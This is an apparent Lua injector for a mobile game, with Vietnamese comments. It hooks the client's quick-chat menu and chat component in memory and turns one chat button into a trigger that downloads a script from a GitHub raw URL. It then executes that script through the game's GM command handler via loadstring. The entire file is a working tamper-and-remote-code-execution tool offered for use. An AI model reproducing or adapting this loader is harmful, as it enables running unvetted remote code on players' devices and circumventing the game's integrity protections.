-- =============================================================
-- FILE TRÊN GITHUB: CHUYỂN HÓA QUICK CHAT THÀNH NÚT TẢI MOD
-- =============================================================

local function Notify(msg)
    pcall(function()
        local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
        if IngameTipsTools and IngameTipsTools.BattleNormalTips then
            IngameTipsTools.BattleNormalTips("Lexusmod: " .. msg, 2, 4)
        end
    end)
end

-- Máy quét RAM: Tìm và kết nối Giao diện với Dữ liệu
local function ScanAndHookSystem()
    local ui_hooked = _G.Lexus_UI_Hooked
    local data_hooked = _G.Lexus_Data_Hooked
    
    -- Quét toàn bộ các file đã được game nạp vào bộ nhớ (RAM)
    for path, module in pairs(package.loaded) do
        
        -- 1. HACK GIAO DIỆN: Ký sinh vào QuickMenu
        if not ui_hooked and type(path) == "string" and string.find(path, "QuickMenu") and type(module) == "table" and module.RefreshQuickChatScroll then
            
            -- Lưu lại hàm làm mới danh sách gốc
            local org_Refresh = module.RefreshQuickChatScroll
            
            module.RefreshQuickChatScroll = function(self)
                -- Để game tự tạo danh sách chat nhanh bình thường
                org_Refresh(self)
                
                -- Sau khi tạo xong, chúng ta TRÁO ĐỔI Ô ĐẦU TIÊN (Index 0)
                pcall(function()
                    if self.UIRoot and self.UIRoot.ScrollBox_Quick then
                        local QuickTextBP = self.UIRoot.ScrollBox_Quick:GetChildAt(0)
                        if QuickTextBP and slua.isValid(QuickTextBP) then
                            -- Đổi chữ hiển thị cực ngầu
                            QuickTextBP.RichTextBlock:SetText("<QuickPhrases>🔥 BẤM ĐỂ TẢI SCRIPT LEXUSMOD 🔥</>")
                            -- Gán mã độc ID: 999999
                            QuickTextBP.MsgID = 999999
                            QuickTextBP.RealTextID = 999999
                        end
                    end
                end)
            end
            
            _G.Lexus_UI_Hooked = true
            ui_hooked = true
            Notify("Đã tạo Nút Kích Hoạt trong Menu Chat Nhanh!")
        end
        
        -- 2. HACK DỮ LIỆU: Rải thảm ChatComponent để đợi ID 999999
        if not data_hooked and type(path) == "string" and string.find(path, "ChatComponent") and type(module) == "table" then
            
            for funcName, func in pairs(module) do
                if type(func) == "function" and not _G["OrgCC_" .. funcName] then
                    _G["OrgCC_" .. funcName] = func
                    
                    module[funcName] = function(self, ...)
                        local args = {...}
                        
                        -- Quét tất cả tham số gửi xuống xem có phải mã 999999 không
                        for _, v in ipairs(args) do
                            if tostring(v) == "999999" then
                                Notify("Đang kéo Script chính từ Github...")
                                
                                local AWSHelper = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.AWSHelper)
                                if AWSHelper then
                                    local URL = "https://raw.githubusercontent.com/khoanguyennoob/luascript/refs/heads/main/script.lua?t=" .. os.time()
                                    AWSHelper:DownloadBinary(URL, function(res)
                                        if res:IsOK() then
                                            pcall(function()
                                                require("GameLua.Mod.BaseMod.Client.ClientCloudGM").HandleCloudGMCMDStr("loadstring\n" .. res:GetContent())
                                            end)
                                            
                                            local time_ticker = require("common.time_ticker")
                                            time_ticker.AddTimerOnce(2, function()
                                                Notify("Kích hoạt Script hoàn tất!")
                                            end)
                                        end
                                    end)
                                end
                                
                                -- Ẩn giao diện Chat đi sau khi bấm
                                pcall(function()
                                    local InGameUITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
                                    local MainUI = InGameUITools.GetMainControlBaseUI()
                                    if MainUI then MainUI:HideQuickChatMenu() end
                                end)
                                
                                return -- Hủy tin nhắn 999999, bảo vệ game không bị lỗi
                            end
                        end
                        
                        -- Trả về chạy bình thường nếu là chat khác
                        return _G["OrgCC_" .. funcName](self, ...)
                    end
                end
            end
            
            _G.Lexus_Data_Hooked = true
            data_hooked = true
            Notify("Đã giăng lưới đón mã 999999!")
        end
    end
    
    return ui_hooked and data_hooked
end

-- Vòng lặp ngầm chạy liên tục tới khi bắt được cả 2 file
local function DaemonWatcher()
    if not pcall(ScanAndHookSystem) or not ScanAndHookSystem() then
        local time_ticker = require("common.time_ticker")
        time_ticker.AddTimerOnce(2, DaemonWatcher)
    end
end

-- Khởi động cỗ máy
pcall(DaemonWatcher)
Notify("Khởi động Radar quét hệ thống In-game...")
